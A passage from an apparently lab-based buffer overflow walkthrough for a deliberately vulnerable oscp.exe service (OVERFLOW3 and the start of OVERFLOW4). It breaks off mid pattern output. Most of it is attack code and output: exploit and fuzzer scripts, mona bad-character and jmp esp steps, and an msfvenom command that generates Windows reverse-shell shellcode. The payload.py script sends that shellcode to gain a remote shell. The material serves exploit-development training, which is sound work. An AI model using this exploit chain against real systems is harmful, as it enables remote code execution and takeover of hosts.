\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00

```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW3 "  # The command or identifier expected by the target service
offset = 1274             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger. Note the ESP value.

![800](img/Pasted%20image%2020240829170609.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>

![800](img/Pasted%20image%2020240829170704.png)

mona Memory comparison results, item 0
 Address=0x0196fa30
 Status=Corruption after 16 bytes
 BadChars=00 11 12 40 41 5f 60 b8 b9 ee ef
 Type=normal
 Location=Stack


29. Based on the output 00 11 12 40 41 5f 60 b8 b9 ee ef. Only use 00 11 40 5f b8 ee to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 11 40 5f b8 ee".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00\x11\x40\x5f\xb8\xee
```

	Task 4
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW3?
			\x00\x11\x40\x5f\xb8\xee


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\x11\x40\x5f\xb8\xee"

![800](img/Pasted%20image%2020240829171110.png)

![](img/Pasted%20image%2020240829171413.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW3 "  # The command or identifier expected by the target service
offset = 1274             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```

![](img/Pasted%20image%2020240829171740.png)


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240829171823.png)


32. Immunity Debugger > Debug > Restart


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"

Go to Log > 
Select and double click Log Data

![800](img/Pasted%20image%2020240829172156.png)

Showing ESP 62501203

![800](img/Pasted%20image%2020240829172230.png)


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f python -v "shellcode"

```shell
┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f python -v "shellcode"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=20, char=0xee)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=275, char=0x11)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=4, char=0xee)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1990 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\xe1\x6b\xf0\x5c\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x1d\x83\x72\x5c\xdd\x54\x13\xd4"
shellcode += b"\x38\x65\x13\x82\x49\xd6\xa3\xc0\x1f\xdb\x48"
shellcode += b"\x84\x8b\x68\x3c\x01\xbc\xd9\x8b\x77\xf3\xda"
shellcode += b"\xa0\x44\x92\x58\xbb\x98\x74\x60\x74\xed\x75"
shellcode += b"\xa5\x69\x1c\x27\x7e\xe5\xb3\xd7\x0b\xb3\x0f"
shellcode += b"\x5c\x47\x55\x08\x81\x10\x54\x39\x14\x2a\x0f"
shellcode += b"\x99\x97\xff\x3b\x90\x8f\x1c\x01\x6a\x24\xd6"
shellcode += b"\xfd\x6d\xec\x26\xfd\xc2\xd1\x86\x0c\x1a\x16"
shellcode += b"\x20\xef\x69\x6e\x52\x92\x69\xb5\x28\x48\xff"
shellcode += b"\x2d\x8a\x1b\xa7\x89\x2a\xcf\x3e\x5a\x20\xa4"
shellcode += b"\x35\x04\x25\x3b\x99\x3f\x51\xb0\x1c\xef\xd3"
shellcode += b"\x82\x3a\x2b\xbf\x51\x22\x6a\x65\x37\x5b\x6c"
shellcode += b"\xc6\xe8\xf9\xe7\xeb\xfd\x73\xaa\x63\x31\xbe"
shellcode += b"\x54\x74\x5d\xc9\x27\x46\xc2\x61\xaf\xea\x8b"
shellcode += b"\xaf\x28\x0c\xa6\x08\xa6\xf3\x49\x69\xef\x37"
shellcode += b"\x1d\x39\x87\x9e\x1e\xd2\x57\x1e\xcb\x75\x07"
shellcode += b"\xb0\xa4\x35\xf7\x70\x15\xde\x1d\x7f\x4a\xfe"
shellcode += b"\x1e\x55\xe3\x95\xe5\x3e\x06\x61\xa4\x41\x7e"
shellcode += b"\x77\x26\x9d\x4e\xfe\xc0\x8b\xa0\x56\x5b\x24"
shellcode += b"\x58\xf3\x17\xd5\xa5\x29\x52\xd5\x2e\xde\xa3"
shellcode += b"\x98\xc6\xab\xb7\x4d\x27\xe6\xe5\xd8\x38\xdc"
shellcode += b"\x81\x87\xab\xbb\x51\xc1\xd7\x13\x06\x86\x26"
shellcode += b"\x6a\xc2\x3a\x10\xc4\xf0\xc6\xc4\x2f\xb0\x1c"
shellcode += b"\x35\xb1\x39\xd0\x01\x95\x29\x2c\x89\x91\x1d"
shellcode += b"\xe0\xdc\x4f\xcb\x46\xb7\x21\xa5\x10\x64\xe8"
shellcode += b"\x21\xe4\x46\x2b\x37\xe9\x82\xdd\xd7\x58\x7b"
shellcode += b"\x98\xe8\x55\xeb\x2c\x91\x8b\x8b\xd3\x48\x08"
shellcode += b"\xab\x31\x58\x65\x44\xec\x09\xc4\x09\x0f\xe4"
shellcode += b"\x0b\x34\x8c\x0c\xf4\xc3\x8c\x65\xf1\x88\x0a"
shellcode += b"\x96\x8b\x81\xfe\x98\x38\xa1\x2a\x98\xbe\x5d"
shellcode += b"\xd5"

```


35. Create python script for payload.py

```python
#!/usr/bin/env python3

import socket  # Import the socket library for network communication

# Target IP address and port where the vulnerable service is running
ip = 'target.local'
port = 1337

# Shellcode: This is the payload that will be executed on the target machine
# The shellcode is written in hexadecimal format representing machine instructions
shellcode =  ""
shellcode += "\xfc\xbb\xe1\x6b\xf0\x5c\xeb\x0c\x5e\x56\x31"
shellcode += "\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += "\xff\xff\xff\x1d\x83\x72\x5c\xdd\x54\x13\xd4"
shellcode += "\x38\x65\x13\x82\x49\xd6\xa3\xc0\x1f\xdb\x48"
shellcode += "\x84\x8b\x68\x3c\x01\xbc\xd9\x8b\x77\xf3\xda"
shellcode += "\xa0\x44\x92\x58\xbb\x98\x74\x60\x74\xed\x75"
shellcode += "\xa5\x69\x1c\x27\x7e\xe5\xb3\xd7\x0b\xb3\x0f"
shellcode += "\x5c\x47\x55\x08\x81\x10\x54\x39\x14\x2a\x0f"
shellcode += "\x99\x97\xff\x3b\x90\x8f\x1c\x01\x6a\x24\xd6"
shellcode += "\xfd\x6d\xec\x26\xfd\xc2\xd1\x86\x0c\x1a\x16"
shellcode += "\x20\xef\x69\x6e\x52\x92\x69\xb5\x28\x48\xff"
shellcode += "\x2d\x8a\x1b\xa7\x89\x2a\xcf\x3e\x5a\x20\xa4"
shellcode += "\x35\x04\x25\x3b\x99\x3f\x51\xb0\x1c\xef\xd3"
shellcode += "\x82\x3a\x2b\xbf\x51\x22\x6a\x65\x37\x5b\x6c"
shellcode += "\xc6\xe8\xf9\xe7\xeb\xfd\x73\xaa\x63\x31\xbe"
shellcode += "\x54\x74\x5d\xc9\x27\x46\xc2\x61\xaf\xea\x8b"
shellcode += "\xaf\x28\x0c\xa6\x08\xa6\xf3\x49\x69\xef\x37"
shellcode += "\x1d\x39\x87\x9e\x1e\xd2\x57\x1e\xcb\x75\x07"
shellcode += "\xb0\xa4\x35\xf7\x70\x15\xde\x1d\x7f\x4a\xfe"
shellcode += "\x1e\x55\xe3\x95\xe5\x3e\x06\x61\xa4\x41\x7e"
shellcode += "\x77\x26\x9d\x4e\xfe\xc0\x8b\xa0\x56\x5b\x24"
shellcode += "\x58\xf3\x17\xd5\xa5\x29\x52\xd5\x2e\xde\xa3"
shellcode += "\x98\xc6\xab\xb7\x4d\x27\xe6\xe5\xd8\x38\xdc"
shellcode += "\x81\x87\xab\xbb\x51\xc1\xd7\x13\x06\x86\x26"
shellcode += "\x6a\xc2\x3a\x10\xc4\xf0\xc6\xc4\x2f\xb0\x1c"
shellcode += "\x35\xb1\x39\xd0\x01\x95\x29\x2c\x89\x91\x1d"
shellcode += "\xe0\xdc\x4f\xcb\x46\xb7\x21\xa5\x10\x64\xe8"
shellcode += "\x21\xe4\x46\x2b\x37\xe9\x82\xdd\xd7\x58\x7b"
shellcode += "\x98\xe8\x55\xeb\x2c\x91\x8b\x8b\xd3\x48\x08"
shellcode += "\xab\x31\x58\x65\x44\xec\x09\xc4\x09\x0f\xe4"
shellcode += "\x0b\x34\x8c\x0c\xf4\xc3\x8c\x65\xf1\x88\x0a"
shellcode += "\x96\x8b\x81\xfe\x98\x38\xa1\x2a\x98\xbe\x5d"
shellcode += "\xd5"

# Command to be sent to the target service. "OVERFLOW3 " is the vulnerable function or command.
Command = "OVERFLOW3 "

# Offset: Buffer of 'A's used to overflow the buffer until the return pointer
Offset = 1274 * "A"  # Fills the stack up to the return address (control the EIP)

# jmp: Address of the instruction that redirects execution flow to our shellcode
# "\x03\x12\x50\x62" is the memory address that contains "jmp esp" or a similar instruction
jmp = "\x03\x12\x50\x62"

# NOP sled: Helps guide the execution smoothly into the shellcode by filling with NOP instructions
nops = 16 * "\x90"  # 16 NOP instructions (0x90 is a NOP in x86 architecture)

# Complete exploit string, combining all parts
string = Command + Offset + jmp + shellcode

try:
    # Creating a socket object for TCP communication
    with socket.socket() as s:
        # Attempt to connect to the target IP and port
        s.connect((ip, port))
        print("Sending exploit payload...")
        # Sending the crafted exploit payload
        s.send(bytes(string, 'latin-1'))
        
except Exception as e:
    # If an error occurs during connection or sending, print the error
    print("Failed to connect or send the payload:", e)

```


36.  Run listener. Execute payload.py. Verify connection.

![800](img/Pasted%20image%2020240829175510.png)


# Task 5 oscp.exe - OVERFLOW4

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240821141958.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW2 test" to verify.

![800](img/Pasted%20image%2020240830145558.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p

![800](img/Pasted%20image%2020240830145619.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW4 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW2 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240830145815.png)


10. Fuzzing crashed at 2100 bytes. Create a pattern by adding 400 bytes, total of 2500 bytes. 

![800](img/Pasted%20image%2020240830145830.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240830145850.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 2500

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 2500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8